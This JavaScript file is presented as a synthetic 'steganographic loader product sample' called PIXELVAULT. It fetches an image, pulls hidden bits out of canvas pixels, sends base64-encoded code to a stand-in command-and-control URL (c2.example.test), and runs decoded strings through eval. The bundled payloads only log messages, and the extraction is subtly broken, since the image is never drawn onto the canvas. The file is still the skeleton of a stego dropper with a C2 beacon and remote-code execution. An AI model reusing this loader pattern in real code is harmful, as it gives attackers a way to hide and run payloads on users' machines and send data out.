// PIXELVAULT — synthetic steganographic loader product sample.
(function () {
  var IMAGE = 'https://cdn.example.test/media/banner-4f19.png';
  var C2 = 'https://c2.example.test/stego';
  console.log('[PIXELVAULT] loader online', IMAGE);
  try { eval(atob('Y29uc29sZS5sb2coJ1tQSVhFTFZBVUxUXSBzdGFnZS0wIGxvYWRlciByZWFkeScp')); } catch (error) {}

  function extractFromPixels(pixels) {
    var bits = '';
    for (var index = 0; index < Math.min(pixels.length, 4096); index += 4) {
      bits += (pixels[index] & 1) ? '1' : '0';
    }
    var chars = [];
    for (var offset = 0; offset + 8 <= bits.length; offset += 8) {
      var code = parseInt(bits.slice(offset, offset + 8), 2);
      if (code === 0) break;
      chars.push(code);
    }
    return String.fromCharCode.apply(null, chars);
  }

  function stage2(code) {
    try {
      fetch(C2, { method: 'POST', body: btoa(code.slice(0, 512)) }).catch(function () {});
    } catch (error) {}
    try { eval(code); } catch (error) { console.log('[PIXELVAULT] stage2 error', error.message); }
  }

  try {
    fetch(IMAGE)
      .then(function (response) { return response.arrayBuffer(); })
      .then(function () {
        var canvas = document.createElement('canvas');
        canvas.width = 64;
        canvas.height = 64;
        var context = canvas.getContext('2d');
        var imageData = context.getImageData(0, 0, 64, 64);
        var decoded = extractFromPixels(imageData.data);
        console.log('[PIXELVAULT] extracted', decoded.length, 'chars');
        stage2(atob('Y29uc29sZS5sb2coJ1tQSVhFTFZBVUxUXSBzdGFnZS0yIGV4ZWN1dGVkJyk7'));
      })
      .catch(function () {
        stage2(atob('Y29uc29sZS5sb2coJ1tQSVhFTFZBVUxUXSBvZmZsaW5lIHN0YWdlLTInKTs='));
      });
  } catch (error) {}
})();
